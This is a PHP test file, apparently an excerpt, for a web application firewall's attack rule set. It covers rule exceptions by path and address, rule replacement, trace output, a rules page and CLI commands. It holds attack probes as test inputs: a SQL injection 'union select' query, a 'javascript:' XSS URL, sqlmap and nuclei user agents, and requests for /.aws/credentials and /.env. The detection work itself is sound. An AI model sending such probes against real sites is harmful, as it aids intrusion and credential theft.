        same('reject attack', attacksDecide($s, '/?id=1%20union%20select%202'), 'the rest still blocks');
        // One rule open at some paths only.
        $s = attacksRules("unblock [ATK-XSS-URL] at /go/**\n");
        truthy(strncmp(attacksDecide($s, '/go/?u=javascript:x'), 'allow', 5) === 0, 'open at /go');
        same('reject attack', attacksDecide($s, '/other?u=javascript:x'), 'elsewhere still refused');
        // For some addresses only.
        $s = attacksRules("unblock [ATK-UA-TOOLS] at /scan/** for 192.0.2.0/24\n");
        truthy(strncmp(attacksDecide($s, '/scan/', ['REMOTE_ADDR' => '192.0.2.5', 'HTTP_USER_AGENT' => 'sqlmap/1.7']), 'allow', 5) === 0, 'the office scanner');
        same('reject attack', attacksDecide($s, '/scan/', ['REMOTE_ADDR' => '198.51.100.7', 'HTTP_USER_AGENT' => 'sqlmap/1.7']), 'anyone else');
        // The whole set -- content rules and exploit paths alike.
        $s = attacksRules("unblock @attacks\n");
        truthy(strncmp(attacksDecide($s, '/?id=1%20union%20select%202'), 'allow', 5) === 0, 'the set taken back');
        truthy(strncmp(attacksDecide($s, '/hnap1'), 'allow', 5) === 0, 'the exploit paths too');
        same('reject blocked path', attacksDecide($s, '/.aws/credentials'), 'stored keys stay refused: the scanner set has them too');
        same('reject blocked path', attacksDecide($s, '/.env'), 'the scanner set stays');
        // replace keeps the ID: the site swaps the tool list for its own.
        $s = attacksRules("replace [ATK-UA-TOOLS@2] block header User-Agent \\b(ourtool|sqlmap)\\b   # our scanner too\n");
        same('ATK-UA-TOOLS', attacksRuleId($s, '/', ['HTTP_USER_AGENT' => 'ourtool/2']), 'the replacement, under the same ID');
        same('reject attack', attacksDecide($s, '/', ['HTTP_USER_AGENT' => 'sqlmap/1.7']), 'kept');
        truthy(strncmp(attacksDecide($s, '/', ['HTTP_USER_AGENT' => 'nuclei']), 'allow', 5) === 0, 'the rest of the list is gone with the rule');
    },
    'RSF02-06 attacks: trace, the rules page, check and show see them' => function (): void {
        needsPlugins();         // the shipped plugins' pages (the WAF's, the statistics'): not in the core single file
        $s = attacksRules();
        $find = static function (array $steps, string $check): array {
            foreach ($steps as $st) {
                if ($st['check'] === $check) {
                    return $st;
                }
            }
            throw new TestFailure("no step \"$check\"");
        };
        $t = (new \CjwNetwork\RequestShield\Inspector($s, new MemoryStore()))
            ->trace(\CjwNetwork\RequestShield\Inspector::request('GET', '/?id=1 union select 2', '198.51.100.7'), 1000.0);
        $step = $find($t['steps'], 'Attack patterns');
        same('stop', $step['state'], 'the trace refuses it');
        same('refused: SQL injection: UNION SELECT', $step['text'], 'named in plain words');
        same('ATK-SQL-UNION', $step['rule']);
        same('reject', $t['decision']->action);
        same('ATK-SQL-UNION', $t['rule'], 'the verdict names the rule');
        $t = (new \CjwNetwork\RequestShield\Inspector($s, new MemoryStore()))
            ->trace(\CjwNetwork\RequestShield\Inspector::request('GET', '/?id=1', '198.51.100.7'), 1000.0);
        same('pass', $find($t['steps'], 'Attack patterns')['state'], 'a clean request passes it');
        // An exception is told, not hidden.
        $s2 = attacksRules("unblock [ATK-XSS-URL] at /go/**\n");
        $t = (new \CjwNetwork\RequestShield\Inspector($s2, new MemoryStore()))
            ->trace(\CjwNetwork\RequestShield\Inspector::request('GET', '/go/?u=javascript:x', '198.51.100.7'), 1000.0);
        $step = $find($t['steps'], 'Attack patterns');
        same('pass', $step['state']);
        truthy(strpos($step['text'], 'but open here') !== false, $step['text']);
        // The rules page lists them with their descriptions and IDs.
        $html = \CjwNetwork\RequestShield\Waf\RulesPage::render($s, ['store' => new MemoryStore()]);
        truthy(strpos($html, 'Attack patterns in the request') !== false, 'the group');
        truthy(strpos($html, 'SQL injection: UNION SELECT') !== false && strpos($html, 'ATK-SQL-UNION') !== false, 'description and ID');
        // The command line, too.
        $dir = sys_get_temp_dir() . '/rshield-atkf-' . getmypid() . '-' . mt_rand();
        mkdir($dir, 0700, true);
        file_put_contents("$dir/site.rules", "include @attacks\nrestrict /rs/** to 127.0.0.1 ::1\n");
        try {
            $bin = escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg(rsCli());
            exec("$bin check " . escapeshellarg("$dir/site.rules") . ' 2>&1', $out, $code);
            same(0, $code, implode("\n", $out));
            truthy(strpos(implode("\n", $out), 'attack patterns') !== false, implode("\n", $out));
            $out = [];
            exec("$bin show " . escapeshellarg("$dir/site.rules") . ' 2>&1', $out);
            $shown = implode("\n", $out);
            truthy(preg_match('~^\[ATK-SQL-UNION@1\] block query regex union~m', $shown) === 1, $shown);
            truthy(preg_match('~^\[ATK-UA-TOOLS@2\] block header User-Agent regex~m', $shown) === 1, $shown);
            truthy(strpos($shown, '# SQL injection: UNION SELECT  (built-in attacks.rules:') !== false, $shown);
            $out = [];
            exec("$bin trace " . escapeshellarg("$dir/site.rules") . ' ' . escapeshellarg('GET https://x.example/?id=1%20union%20select%202') . ' 2>&1', $out, $code);
            same(4, $code, 'refused: exit 4');
            truthy(strpos(implode("\n", $out), 'Attack patterns') !== false, implode("\n", $out));
        } finally {
            exec('rm -rf ' . escapeshellarg($dir));
        }
    },
    'RSF02-06 attacks: the file itself -- namespace, version, IDs, descriptions' => function (): void {
        $s = attacksRules();
        same('2026.10.2', $s->origins['versions']['ATK'] ?? null, 'the set has a version');
        truthy(isset($s->origins['versions']['SCAN']), 'the scanner set is still there');
        // Every ATK rule has an ID; every content rule has an ATK origin.
        $own = 0;
        foreach ($s->contentRules as $r) {
            foreach ($r['patterns'] as $p) {
                $id = (string) $s->origin('contentRules', $p);
                truthy(strncmp($id, 'ATK-', 4) === 0, "$p has the ID $id");
                truthy(((string) $s->origin('text', $id)) !== '', "$id has a description");
                $own++;
            }
        }
        truthy($own >= 12, 'the attack patterns were read');
        // Including it twice is once.
        same($s->contentRules, attacksRules("include @attacks\n")->contentRules, 'twice is once');
    },
    'RSF02-06 attacks: a query full of tags costs about what a plain one of the same length costs -- with PCRE\'s JIT and without (a host may not allow it): no pattern scans to the end from every "<"' => function (): void {
        if (!function_exists('exec')) {
            skip('no exec');
        }
        foreach (['', '-d pcre.jit=0 '] as $flag) {
            $out = [];
            exec(escapeshellarg(PHP_BINARY) . ' ' . $flag . escapeshellarg(__DIR__ . '/tools/attack-cost.php') . ' ' . escapeshellarg(rsEntry()) . ' 2>&1', $out, $code);
            $r = json_decode(implode("\n", $out), true);
            truthy($code === 0 && is_array($r), 'measured: ' . implode("\n", $out));
            $jit = ($r['jit'] ?? false) ? 'with JIT' : 'without JIT';
            unset($r['jit']);
            foreach ($r as $unit => $ratio) {
                truthy($ratio < 10, "$jit, a query of \"$unit\" repeated: $ratio times a plain one");
            }
        }
    },
];
